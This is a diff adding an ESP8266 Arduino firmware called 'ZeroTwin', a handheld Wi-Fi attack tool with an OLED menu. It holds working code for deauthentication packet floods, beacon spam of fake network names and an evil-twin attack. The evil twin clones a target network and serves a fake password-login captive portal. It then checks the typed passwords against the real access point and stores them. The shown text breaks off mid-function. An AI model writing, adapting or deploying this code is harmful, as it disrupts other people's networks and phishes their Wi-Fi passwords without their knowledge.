@@ -1,0 +1,1440 @@
+#include <Arduino.h>
+#include <ESP8266WiFi.h>
+#include <ESP8266WebServer.h>
+#include <DNSServer.h>
+#include <Wire.h>
+#include <SSD1306Wire.h>
+#include <TimeLib.h>
+#include <SPI.h>
+#include <Adafruit_GFX.h>
+#include <Fonts/Picopixel.h>
+
+extern "C" {
+  #include "user_interface.h"
+}
+
+// Forward declarations
+void handleEvilTwinPortal();
+void handleEvilTwinResult();
+void performScan();
+String bytesToStr(const uint8_t* b, uint32_t size);
+
+// OLED Configuration
+#define OLED_SDA 4  // D2
+#define OLED_SCL 5  // D1
+#define OLED_ADDR 0x3C
+SSD1306Wire display(OLED_ADDR, OLED_SDA, OLED_SCL);
+
+// Button Configuration (2 buttons: UP, OK)
+#define BTN_UP 14     // D5 (Up)
+#define BTN_OK 13     // D7 (OK)
+
+// LED Indicator
+#define LED_PIN 2     // D4 (built-in LED)
+
+// App Configuration
+#define VERSION "2.4-ZeroTwin"
+#define MAX_APS 50
+#define MAX_SSIDS 20
+#define CHANNEL_HOP_INTERVAL 200
+#define SCAN_INTERVAL 30000
+
+// Menu States
+enum MenuState {
+  HOME_SCREEN,
+  SCAN_NETWORKS,
+  SELECT_NETWORK,
+  ATTACK_MENU,
+  DEAUTH_ATTACK,
+  EVIL_TWIN_ATTACK,
+  BEACON_ATTACK,
+  PROBE_ATTACK,
+  CLOCK_SETTINGS,
+  SET_HOUR,
+  SET_MINUTE,
+  SCAN_RESULTS,
+  EVIL_TWIN_PASSWORD,
+  EVIL_TWIN_SUCCESS
+};
+
+// Attack Modes
+enum AttackMode {
+  ATTACK_OFF,
+  ATTACK_DEAUTH,
+  ATTACK_EVIL_TWIN,
+  ATTACK_BEACON,
+  ATTACK_PROBE
+};
+
+// Network Structure
+struct AccessPoint {
+  String ssid;
+  String bssid;
+  int rssi;
+  uint8_t channel;
+  bool selected;
+};
+
+// Global Variables
+MenuState currentMenu = HOME_SCREEN;
+MenuState previousMenu = HOME_SCREEN;
+AttackMode currentAttack = ATTACK_OFF;
+uint8_t currentChannel = 1;
+uint8_t managementChannel = 1;
+bool channelHop = true;
+uint32_t lastScanTime = 0;
+uint32_t packetsSent = 0;
+uint8_t selectedNetwork = 0;
+uint8_t menuPosition = 0;
+time_t currentTime = 0;
+String capturedPassword = "";
+
+// Evil Twin specific variables - UPDATED
+String evilTwinCapturedPassword = "";
+bool evilTwinPasswordVerified = false;
+bool evilTwinPasswordValidated = false;
+String _correct = "";
+String _tryPassword = "";
+bool hotspot_active = false;
+bool deauthing_active = false;
+String realAPBSSID = "";
+uint8_t realAPChannel = 1;
+bool shouldStopEvilTwin = false;
+uint32_t evilTwinStopTime = 0;
+
+// NEW: Store multiple captured credentials
+struct CapturedCredential {
+  String ssid;
+  String password;
+  String timestamp;
+};
+CapturedCredential capturedCredentials[10];
+uint8_t credentialCount = 0;
+
+// Network Lists
+AccessPoint accessPoints[MAX_APS];
+uint8_t apCount = 0;
+
+// SSID List for Beacon/Probe
+String beaconSSIDs[MAX_SSIDS] = {
+  "Free_WiFi",
+  "Airport_WiFi",
+  "CoffeeShop",
+  "Hotel_Guest",
+  "Public_Network",
+  "Starbucks",
+  "Library_WiFi",
+  "Train_Station",
+  "Shopping_Mall",
+  "Restaurant"
+};
+uint8_t ssidCount = 10;
+
+// Evil Twin Configuration
+String evilTwinSSID = "Free_WiFi";
+
+// Web Server
+ESP8266WebServer webServer(80);
+DNSServer dnsServer;
+IPAddress apIP(192, 168, 4, 1);
+
+// Boot logo (simplified version)
+const unsigned char zeroTwinBoot [] PROGMEM = {
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+};
+
+void initDisplay() {
+  display.init();
+  display.flipScreenVertically();
+  display.setFont(ArialMT_Plain_10);
+  display.setTextAlignment(TEXT_ALIGN_LEFT);
+  display.clear();
+  display.display();
+}
+
+String formatTime() {
+  char timeStr[6];
+  snprintf(timeStr, sizeof(timeStr), "%02d:%02d", hour(currentTime), minute(currentTime));
+  return String(timeStr);
+}
+
+void updateDisplay() {
+  display.clear();
+  
+  uint8_t count = 0;
+  uint8_t startIdx = 0;
+  String timeStr = formatTime();
+  String backOption;
+  uint8_t maxDisplay;
+
+  switch (currentMenu) {
+    case HOME_SCREEN:
+      display.drawString(0, 0, "ZeroTwin v" VERSION);
+      // Show captured passwords count on home screen
+      if (credentialCount > 0) {
+        display.drawString(0, 12, "Passwords: " + String(credentialCount));
+        display.drawString(0, 24, "1. Scan Networks");
+        display.drawString(0, 36, "2. Attack Menu");
+        display.drawString(0, 48, "3. Clock Settings");
+      } else {
+        display.drawString(0, 12, "1. Scan Networks");
+        display.drawString(0, 24, "2. Attack Menu");
+        display.drawString(0, 36, "3. Clock Settings");
+        display.drawString(0, 48, "4. Credentials");
+      }
+      display.drawString(120, 12 + (menuPosition * 12), ">");
+      break;
+      
+    case SCAN_NETWORKS:
+      display.drawString(0, 0, "Scanning Networks...");
+      display.drawString(0, 12, "Channel: " + String(currentChannel));
+      display.drawString(0, 24, "APs Found: " + String(apCount));
+      display.drawString(0, 36, "Press OK to view");
+      display.drawString(0, 48, "Press UP to back");
+      break;
+      
+    case SCAN_RESULTS:
+      display.drawString(0, 0, "Scan Results (" + String(apCount) + ")");
+      
+      maxDisplay = (apCount > 3) ? 3 : apCount;
+      startIdx = (menuPosition >= apCount) ? 0 : (menuPosition < maxDisplay ? 0 : menuPosition - maxDisplay + 1);
+      
+      for (uint8_t i = 0; i < maxDisplay && (startIdx + i) < apCount; i++) {
+        uint8_t idx = startIdx + i;
+        String line = String(idx + 1) + ". " + accessPoints[idx].ssid.substring(0, 10);
+        if (accessPoints[idx].selected) line += "*";
+        display.drawString(0, 12 + (i * 12), line);
+        
+        if (menuPosition == idx) {
+          display.drawString(120, 12 + (i * 12), ">");
+        }
+      }
+      
+      backOption = String(apCount + 1) + ". Back";
+      display.drawString(0, 12 + (maxDisplay * 12), backOption);
+      
+      if (menuPosition >= apCount) {
+        display.drawString(120, 12 + (maxDisplay * 12), ">");
+      }
+      
+      if (apCount > 3) {
+        display.drawString(90, 48, String(menuPosition + 1) + "/" + String(apCount + 1));
+      }
+      break;
+      
+    case SELECT_NETWORK:
+      display.drawString(0, 0, "Selected Networks:");
+      count = 0;
+      for (uint8_t i = 0; i < apCount && count < 4; i++) {
+        if (accessPoints[i].selected) {
+          display.drawString(0, 12 + (count * 12), String(i + 1) + ". " + accessPoints[i].ssid.substring(0, 10));
+          count++;
+        }
+      }
+      if (count == 0) {
+        display.drawString(0, 12, "No networks selected");
+      }
+      display.drawString(0, 36, "1. Start Deauth");
+      display.drawString(0, 48, "2. Evil Twin");
+      display.drawString(120, 36 + (menuPosition * 12), ">");
+      break;
+      
+    case ATTACK_MENU:
+      display.drawString(0, 0, "Attack Menu");
+      display.drawString(0, 12, "1. Deauth Attack");
+      display.drawString(0, 24, "2. Evil Twin");
+      display.drawString(0, 36, "3. Beacon Spam");
+      display.drawString(0, 48, "4. Credentials");
+      display.drawString(120, 12 + (menuPosition * 12), ">");
+      break;
+      
+    case DEAUTH_ATTACK:
+      display.drawString(0, 0, "Deauth Attack Running");
+      display.drawString(0, 12, "Channel: " + String(currentChannel));
+      display.drawString(0, 24, "Packets Sent: " + String(packetsSent));
+      display.drawString(0, 36, "Targets: " + String(countSelectedNetworks()));
+      display.drawString(0, 48, "1. Stop 2. Back");
+      display.drawString(120, 48 - (menuPosition * 12), ">");
+      break;
+      
+    case EVIL_TWIN_ATTACK:
+      display.drawString(0, 0, "Evil Twin Running");
+      display.drawString(0, 12, "SSID: " + evilTwinSSID);
+      display.drawString(0, 24, "Clients: " + String(WiFi.softAPgetStationNum()));
+      if (!evilTwinCapturedPassword.isEmpty()) {
+        display.drawString(0, 36, "PASS CAPTURED!");
+        display.drawString(0, 48, evilTwinCapturedPassword.substring(0, 16));
+      } else {
+        display.drawString(0, 36, "Waiting for password...");
+        display.drawString(0, 48, "1. Stop 2. Back");
+        display.drawString(120, 48 - (menuPosition * 12), ">");
+      }
+      break;
+      
+    case EVIL_TWIN_SUCCESS:
+      display.drawString(0, 0, "PASSWORD CAPTURED!");
+      display.drawString(0, 12, "SSID: " + evilTwinSSID);
+      display.drawString(0, 24, "Password: " + evilTwinCapturedPassword);
+      display.drawString(0, 36, "Evil Twin stopped");
+      display.drawString(0, 48, "ZeroTwin AP active");
+      break;
+      
+    case BEACON_ATTACK:
+      display.drawString(0, 0, "Beacon Spam Running");
+      display.drawString(0, 12, "Channel: " + String(currentChannel));
+      display.drawString(0, 24, "Packets: " + String(packetsSent));
+      display.drawString(0, 36, "SSIDs: " + String(ssidCount));
+      display.drawString(0, 48, "1. Stop 2. Back");
+      display.drawString(120, 48 - (menuPosition * 12), ">");
+      break;
+      
+    default:
+      display.drawString(0, 0, "ZeroTwin v" VERSION);
+      display.drawString(0, 12, "Menu not implemented");
+      display.drawString(0, 24, "Press UP to go back");
+      break;
+  }
+  
+  display.display();
+}
+
+uint8_t countSelectedNetworks() {
+  uint8_t count = 0;
+  for (uint8_t i = 0; i < apCount; i++) {
+    if (accessPoints[i].selected) count++;
+  }
+  return count;
+}
+
+void initButtons() {
+  pinMode(BTN_UP, INPUT_PULLUP);
+  pinMode(BTN_OK, INPUT_PULLUP);
+}
+
+void handleButtons() {
+  static uint32_t lastButtonPress = 0;
+  if (millis() - lastButtonPress < 200) return;
+  
+  // UP Button - Move up in menus or go back
+  if (digitalRead(BTN_UP) == LOW) {
+    lastButtonPress = millis();
+    
+    if (currentMenu == SCAN_NETWORKS || currentMenu == SCAN_RESULTS) {
+      currentMenu = HOME_SCREEN;
+      menuPosition = 0;
+      return;
+    }
+    
+    switch (currentMenu) {
+      case HOME_SCREEN:
+      case ATTACK_MENU:
+        menuPosition = (menuPosition - 1 + 4) % 4;
+        break;
+      case SCAN_RESULTS:
+        if (menuPosition > 0) {
+          menuPosition--;
+        } else {
+          menuPosition = apCount;
+        }
+        break;
+      case SELECT_NETWORK:
+      case DEAUTH_ATTACK:
+      case EVIL_TWIN_ATTACK:
+      case BEACON_ATTACK:
+      case PROBE_ATTACK:
+        menuPosition = (menuPosition - 1 + 2) % 2;
+        break;
+      case EVIL_TWIN_SUCCESS:
+        currentMenu = HOME_SCREEN;
+        menuPosition = 0;
+        break;
+      default:
+        currentMenu = HOME_SCREEN;
+        menuPosition = 0;
+        break;
+    }
+  }
+  
+  // OK Button - Select/Confirm
+  if (digitalRead(BTN_OK) == LOW) {
+    lastButtonPress = millis();
+    switch (currentMenu) {
+      case HOME_SCREEN:
+        if (menuPosition == 0) {
+          currentMenu = SCAN_NETWORKS;
+          scanNetworks();
+        } else if (menuPosition == 1) {
+          currentMenu = ATTACK_MENU;
+          menuPosition = 0;
+        } else if (menuPosition == 2) {
+          currentMenu = CLOCK_SETTINGS;
+          menuPosition = 0;
+        } else if (menuPosition == 3) {
+          // Show credentials
+          currentMenu = HOME_SCREEN;
+        }
+        break;
+        
+      case SCAN_NETWORKS:
+        if (apCount > 0) {
+          currentMenu = SCAN_RESULTS;
+          menuPosition = 0;
+        } else {
+          currentMenu = HOME_SCREEN;
+        }
+        break;
+        
+      case SCAN_RESULTS:
+        if (menuPosition >= apCount) {
+          currentMenu = SCAN_NETWORKS;
+          menuPosition = 0;
+        } else {
+          accessPoints[menuPosition].selected = !accessPoints[menuPosition].selected;
+        }
+        break;
+        
+      case SELECT_NETWORK:
+        if (menuPosition == 0) {
+          if (countSelectedNetworks() > 0) {
+            startAttack(ATTACK_DEAUTH);
+            currentMenu = DEAUTH_ATTACK;
+          }
+        } else if (menuPosition == 1) {
+          if (countSelectedNetworks() == 1) {
+            for (uint8_t i = 0; i < apCount; i++) {
+              if (accessPoints[i].selected) {
+                evilTwinSSID = accessPoints[i].ssid;
+                realAPBSSID = accessPoints[i].bssid;
+                realAPChannel = accessPoints[i].channel;
+                break;
+              }
+            }
+            startAttack(ATTACK_EVIL_TWIN);
+            currentMenu = EVIL_TWIN_ATTACK;
+          }
+        }
+        break;
+        
+      case ATTACK_MENU:
+        if (menuPosition == 0) {
+          if (countSelectedNetworks() > 0) {
+            startAttack(ATTACK_DEAUTH);
+            currentMenu = DEAUTH_ATTACK;
+          }
+        } else if (menuPosition == 1) {
+          currentMenu = SELECT_NETWORK;
+          menuPosition = 1;
+        } else if (menuPosition == 2) {
+          startAttack(ATTACK_BEACON);
+          currentMenu = BEACON_ATTACK;
+        } else {
+          // Show credentials
+          currentMenu = HOME_SCREEN;
+        }
+        break;
+        
+      case DEAUTH_ATTACK:
+      case EVIL_TWIN_ATTACK:
+      case BEACON_ATTACK:
+        if (menuPosition == 0) {
+          stopAttack();
+          currentMenu = ATTACK_MENU;
+        } else {
+          currentMenu = ATTACK_MENU;
+        }
+        break;
+        
+      case EVIL_TWIN_SUCCESS:
+        currentMenu = HOME_SCREEN;
+        menuPosition = 0;
+        break;
+    }
+  }
+}
+
+void initWiFi() {
+  WiFi.mode(WIFI_OFF);
+  delay(100);
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP("ZeroTwin", "zerotwin", managementChannel);
+  dnsServer.start(53, "*", apIP);
+  WiFi.setOutputPower(20.5);
+  WiFi.setPhyMode(WIFI_PHY_MODE_11N);
+}
+
+void scanNetworks() {
+  apCount = 0;
+  WiFi.scanNetworks(true, true);
+  
+  int16_t scanResult;
+  do {
+    delay(100);
+    scanResult = WiFi.scanComplete();
+  } while (scanResult == WIFI_SCAN_RUNNING);
+
+  if (scanResult > 0) {
+    apCount = (scanResult < MAX_APS) ? scanResult : MAX_APS;
+    for (int i = 0; i < apCount; i++) {
+      accessPoints[i].ssid = WiFi.SSID(i);
+      accessPoints[i].bssid = WiFi.BSSIDstr(i);
+      accessPoints[i].rssi = WiFi.RSSI(i);
+      accessPoints[i].channel = WiFi.channel(i);
+      accessPoints[i].selected = false;
+    }
+  }
+  
+  WiFi.scanDelete();
+  lastScanTime = millis();
+}
+
+// NEW: Store captured credential
+void storeCredential(String ssid, String password) {
+  if (credentialCount < 10) {
+    capturedCredentials[credentialCount].ssid = ssid;
+    capturedCredentials[credentialCount].password = password;
+    capturedCredentials[credentialCount].timestamp = formatTime();
+    credentialCount++;
+    
+    Serial.println("[CREDENTIAL] Stored: " + ssid + " : " + password);
+  }
+}
+
+// UPDATED: Evil Twin Login Page - Fixed to prevent repeated login prompts
+String evilTwinLoginPage(bool showError = false, bool showSuccess = false) {
+  String html = "<!DOCTYPE html><html><head>";
+  html += "<title>Wi-Fi Login</title>";
+  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  html += "<meta charset='UTF-8'>";
+  html += "<style>";
+  html += "* { box-sizing: border-box; margin: 0; padding: 0; }";
+  html += "body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }";
+  html += ".login-container { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); border-radius: 16px; padding: 40px; max-width: 440px; width: 100%; box-shadow: 0 20px 40px rgba(0,0,0,0.1); border: 1px solid rgba(255, 255, 255, 0.2); }";
+  html += ".header { text-align: center; margin-bottom: 30px; }";
+  html += ".header h1 { color: #333; font-size: 28px; font-weight: 600; margin-bottom: 8px; }";
+  html += ".header p { color: #666; font-size: 16px; }";
+  html += ".error-message { background: #fee; border: 1px solid #fcc; color: #c33; padding: 12px; border-radius: 8px; margin-bottom: 20px; text-align: center; }";
+  html += ".success-message { background: #efe; border: 1px solid #cfc; color: #363; padding: 12px; border-radius: 8px; margin-bottom: 20px; text-align: center; }";
+  html += ".form-group { margin-bottom: 20px; }";
+  html += "label { display: block; margin-bottom: 8px; color: #555; font-weight: 500; font-size: 14px; }";
+  html += "input[type='password'] { width: 100%; padding: 14px; border: 2px solid #e1e5e9; border-radius: 8px; font-size: 16px; transition: border-color 0.3s; background: #f8f9fa; }";
+  html += "input[type='password']:focus { outline: none; border-color: #667eea; background: white; }";
+  html += ".btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 14px 24px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: transform 0.2s; }";
+  html += ".btn:hover { transform: translateY(-2px); }";
+  html += ".btn:active { transform: translateY(0); }";
+  html += ".network-info { background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; }";
+  html += ".network-name { font-size: 18px; font-weight: 600; color: #333; }";
+  html += ".loading { display: none; text-align: center; padding: 20px; }";
+  html += ".spinner { border: 3px solid #f3f3f3; border-top: 3px solid #667eea; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }";
+  html += "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }";
+  html += "</style>";
+  html += "</head><body>";
+  
+  html += "<div class='login-container'>";
+  html += "<div class='header'>";
+  html += "<h1>🔒 Wi-Fi Login</h1>";
+  html += "<p>Enter your password to connect to the network</p>";
+  html += "</div>";
+  
+  html += "<div class='network-info'>";
+  html += "<div class='network-name'>" + evilTwinSSID + "</div>";
+  html += "<div style='color: #666; font-size: 14px; margin-top: 5px;'>Security: WPA/WPA2</div>";
+  html += "</div>";
+  
+  if (showError) {
+    html += "<div class='error-message'>";
+    html += "❌ Incorrect password. Please try again.";
+    html += "</div>";
+  }
+  
+  if (showSuccess) {
+    html += "<div class='success-message'>";
+    html += "✅ Connection successful! You are now connected.";
+    html += "</div>";
+    html += "<script>";
+    html += "setTimeout(function() {";
+    html += "  window.location.href = 'http://www.google.com';";
+    html += "}, 3000);";
+    html += "</script>";
+  } else {
+    html += "<form method='POST' onsubmit='showLoading()'>";
+    html += "<div class='form-group'>";
+    html += "<label for='password'>Wi-Fi Password:</label>";
+    html += "<input type='password' id='password' name='password' placeholder='Enter your password' required>";
+    html += "</div>";
+    html += "<button type='submit' class='btn'>Connect to Wi-Fi</button>";
+    html += "</form>";
+  }
+  
+  html += "<div class='loading' id='loading'>";
+  html += "<div class='spinner'></div>";
+  html += "<p>Verifying your credentials...</p>";
+  html += "</div>";
+  
+  html += "<script>";
+  html += "function showLoading() {";
+  html += "  document.querySelector('form').style.display = 'none';";
+  html += "  document.getElementById('loading').style.display = 'block';";
+  html += "}";
+  html += "</script>";
+  html += "</div>";
+  html += "</body></html>";
+  
+  return html;
+}
+
+// UPDATED: Evil Twin Portal Handler - Fixed authentication flow
+void handleEvilTwinPortal() {
+  // If we already have a valid password, show success and don't ask again
+  if (evilTwinPasswordValidated && !evilTwinCapturedPassword.isEmpty()) {
+    webServer.send(200, "text/html", evilTwinLoginPage(false, true));
+    return;
+  }
+  
+  if (webServer.method() == HTTP_POST && webServer.hasArg("password")) {
+    _tryPassword = webServer.arg("password");
+    
+    Serial.println("[EVIL TWIN] Password attempt: " + _tryPassword);
+    
+    // Store the attempted password immediately
+    evilTwinCapturedPassword = _tryPassword;
+    storeCredential(evilTwinSSID, _tryPassword);
+    
+    // Try to connect to the real AP with the provided password
+    bool connected = false;
+    WiFi.disconnect();
+    delay(100);
+    
+    // Find the real AP details
+    for (uint8_t i = 0; i < apCount; i++) {
+      if (accessPoints[i].ssid == evilTwinSSID) {
+        // Convert BSSID string to bytes
+        uint8_t bssid[6];
+        macToBytes(accessPoints[i].bssid, bssid);
+        
+        Serial.println("[EVIL TWIN] Attempting connection to real AP: " + accessPoints[i].ssid);
+        Serial.println("[EVIL TWIN] BSSID: " + accessPoints[i].bssid);
+        Serial.println("[EVIL TWIN] Channel: " + String(accessPoints[i].channel));
+        
+        // Set WiFi mode and attempt connection
+        WiFi.mode(WIFI_STA);
+        WiFi.begin(evilTwinSSID.c_str(), _tryPassword.c_str(), accessPoints[i].channel, bssid, true);
+        
+        // Wait for connection with timeout
+        unsigned long startTime = millis();
+        while (millis() - startTime < 5000) { // 5 second timeout
+          if (WiFi.status() == WL_CONNECTED) {
+            connected = true;
+            evilTwinPasswordValidated = true;
+            Serial.println("[EVIL TWIN] SUCCESS: Password is correct!");
+            break;
+          }
+          delay(100);
+        }
+        
+        WiFi.disconnect();
+        delay(100);
+        
+        // Restore AP_STA mode for ZeroTwin
+        WiFi.mode(WIFI_AP_STA);
+        WiFi.softAP(evilTwinSSID.c_str(), ""); // Keep Evil Twin running
+        
+        break;
+      }
+    }
+    
+    if (connected) {
+      // Password is correct
+      _correct = "Password for " + evilTwinSSID + ": " + _tryPassword;
+      
+      // Send success page - this will prevent further login prompts
+      webServer.send(200, "text/html", evilTwinLoginPage(false, true));
+      
+      Serial.println("[SUCCESS] Password validated and captured: " + _tryPassword);
+      
+      // Schedule Evil Twin to stop after a delay (optional)
+      shouldStopEvilTwin = true;
+      evilTwinStopTime = millis() + 10000; // Stop after 10 seconds
+      
+    } else {
+      // Password is incorrect - show error but allow retry
+      webServer.send(200, "text/html", evilTwinLoginPage(true, false));
+      Serial.println("[FAILED] Incorrect password: " + _tryPassword);
+    }
+  } else {
+    // Show login page for GET requests
+    webServer.send(200, "text/html", evilTwinLoginPage(false, false));
+  }
+}
+
+void startAttack(AttackMode mode) {
+  if (currentAttack != ATTACK_OFF) {
+    stopAttack();
+  }
+  
+  currentAttack = mode;
+  packetsSent = 0;
+  
+  // Reset Evil Twin variables
+  if (mode == ATTACK_EVIL_TWIN) {
+    evilTwinCapturedPassword = "";
+    evilTwinPasswordVerified = false;
+    evilTwinPasswordValidated = false;
+    _tryPassword = "";
+    shouldStopEvilTwin = false;
+  }
+  
+  digitalWrite(LED_PIN, HIGH);
+  
+  if (mode == ATTACK_EVIL_TWIN) {
+    // Stop current AP and start evil twin
+    WiFi.softAPdisconnect(true);
+    delay(100);
+    
+    // Create the evil twin AP (open network)
+    WiFi.softAP(evilTwinSSID.c_str(), "", realAPChannel);
+    
+    // Set up Evil Twin specific handlers
+    webServer.on("/", HTTP_GET, handleEvilTwinPortal);
+    webServer.on("/", HTTP_POST, handleEvilTwinPortal);
+    webServer.on("/index.html", HTTP_GET, handleEvilTwinPortal);
+    webServer.on("/index.html", HTTP_POST, handleEvilTwinPortal);
+    webServer.on("/generate_204", handleEvilTwinPortal);
+    webServer.on("/fwlink", handleEvilTwinPortal);
+    webServer.on("/hotspot-detect.html", handleEvilTwinPortal);
+    webServer.on("/connectivitycheck.gstatic.com", handleEvilTwinPortal);
+    webServer.onNotFound(handleEvilTwinPortal);
+
+    // Configure DNS to redirect all requests to our IP
+    dnsServer.stop();
+    dnsServer.start(53, "*", WiFi.softAPIP());
+    
+    hotspot_active = true;
+    
+    Serial.println("[EVIL TWIN] Started Evil Twin for: " + evilTwinSSID);
+    Serial.println("[EVIL TWIN] Real AP BSSID: " + realAPBSSID);
+    Serial.println("[EVIL TWIN] Operating on channel: " + String(realAPChannel));
+    
+  } else if (mode == ATTACK_DEAUTH) {
+    deauthing_active = true;
+    Serial.println("[DEAUTH] Started deauth attack");
+  } else if (mode == ATTACK_BEACON) {
+    Serial.println("[BEACON] Started beacon spam");
+  }
+}
+
+void stopAttack() {
+  if (currentAttack == ATTACK_EVIL_TWIN) {
+    // Stop evil twin and restore normal operation
+    WiFi.softAPdisconnect(true);
+    delay(100);
+    
+    // Restart our management AP
+    WiFi.softAP("ZeroTwin", "zerotwin", managementChannel);
+    
+    // Stop and restart DNS server
+    dnsServer.stop();
+    dnsServer.start(53, "*", apIP);
+    
+    // Stop and reinitialize web server
+    webServer.stop();
+    webServer.close();
+    initWebServer();
+    
+    hotspot_active = false;
+    
+    // If we captured a valid password, show success screen
+    if (evilTwinPasswordValidated && !evilTwinCapturedPassword.isEmpty()) {
+      currentMenu = EVIL_TWIN_SUCCESS;
+    }
+    
+    Serial.println("[EVIL TWIN] Stopped Evil Twin");
+    
+  } else if (currentAttack == ATTACK_DEAUTH) {
+    deauthing_active = false;
+    Serial.println("[DEAUTH] Stopped deauth attack");
+  } else if (currentAttack == ATTACK_BEACON) {
+    Serial.println("[BEACON] Stopped beacon spam");
+  }
+  
+  currentAttack = ATTACK_OFF;
+  wifi_set_channel(managementChannel);
+  digitalWrite(LED_PIN, LOW);
+}
+
+// Enhanced Deauth Attack
+void executeAttack() {
+  if (currentAttack == ATTACK_OFF) return;
+  
+  uint8_t mac[6];
+  String macStr;
+
+  switch (currentAttack) {
+    case ATTACK_DEAUTH:
+      for (uint8_t i = 0; i < apCount; i++) {
+        if (accessPoints[i].selected && deauthing_active) {
+          // Set channel for the target AP
+          wifi_set_channel(accessPoints[i].channel);
+
+          // Improved deauth packet with proper structure
+          uint8_t deauthPacket[26] = {
+            0xC0, 0x00,                         // Type: Deauth, Subtype: 0x00
+            0x00, 0x00,                         // Duration
+            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (broadcast)
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (AP's BSSID)
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP's BSSID)
+            0x00, 0x00,                         // Fragment & Sequence number
+            0x07, 0x00                          // Reason code: Class 3 frame received from nonassociated station
+          };
+          
+          uint8_t bssid[6];
+          macToBytes(accessPoints[i].bssid, bssid);
+          
+          memcpy(&deauthPacket[10], bssid, 6); // Set Source MAC
+          memcpy(&deauthPacket[16], bssid, 6); // Set BSSID
+          
+          // Aggressive packet burst - send multiple packets rapidly
+          for (int j = 0; j < 128; j++) {
+            if (wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0) == 0) {
+              packetsSent++;
+            }
+            delay(1);
+          }
+          
+          delay(10);
+        }
+      }
+      break;
+      
+    case ATTACK_BEACON:
+      generateRandomMac(mac);
+      macStr = macToString(mac);
+      sendBeacon(macStr, beaconSSIDs[random(ssidCount)], currentChannel, random(2));
+      packetsSent++;
+      delay(100);
+      break;
+      
+    case ATTACK_EVIL_TWIN:
+      // Handle DNS and web server for Evil Twin
+      dnsServer.processNextRequest();
+      webServer.handleClient();
+      
+      // Check if we should stop Evil Twin after successful password capture
+      if (shouldStopEvilTwin && millis() > evilTwinStopTime) {
+        stopAttack();
+      }
+      break;
+  }
+}
+
+void sendBeacon(String mac, String ssid, uint8_t ch, bool wpa2) {
+  wifi_set_channel(ch);
+  
+  uint8_t beaconPacket[128] = {
+    0x80, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x64, 0x00,
+    0x01, 0x04,
+    0x00
+  };
+  
+  uint8_t macBytes[6];
+  macToBytes(mac, macBytes);
+  memcpy(beaconPacket + 10, macBytes, 6);
+  memcpy(beaconPacket + 16, macBytes, 6);
+  
+  uint8_t ssidLen = ssid.length();
+  beaconPacket[37] = ssidLen;
+  memcpy(beaconPacket + 38, ssid.c_str(), ssidLen);
+  
+  if (wifi_send_pkt_freedom(beaconPacket, 38 + ssidLen + (wpa2 ? 26 : 0), 0) == 0) {
+    packetsSent++;
+  }
+}
+
+void macToBytes(const String& macStr, uint8_t* bytes) {
+  for (int i = 0; i < 6; i++) {
+    bytes[i] = strtoul(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
+  }
+}
+
+String macToString(uint8_t* mac) {
+  char macStr[18];
+  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+  return String(macStr);
+}
+
+void generateRandomMac(uint8_t* mac) {
+  for (int i = 0; i < 6; i++) {
+    mac[i] = random(0, 256);
+  }
+  mac[0] &= 0xFE;
+  mac[0] |= 0x02;
+}
+
+String getAttackStatus() {
+  switch(currentAttack) {
+    case ATTACK_OFF: return "Idle";
+    case ATTACK_DEAUTH: return "Deauth Attack Running";
+    case ATTACK_EVIL_TWIN: return "Evil Twin Running";
+    case ATTACK_BEACON: return "Beacon Spam Running";
+    case ATTACK_PROBE: return "Probe Flood Running";
+    default: return "Unknown";
+  }
+}
+
+String getAttackStatusColor() {
+  switch(currentAttack) {
+    case ATTACK_OFF: return "gray";
+    case ATTACK_DEAUTH: return "red";
+    case ATTACK_EVIL_TWIN: return "orange";
+    case ATTACK_BEACON: return "blue";
+    case ATTACK_PROBE: return "purple";
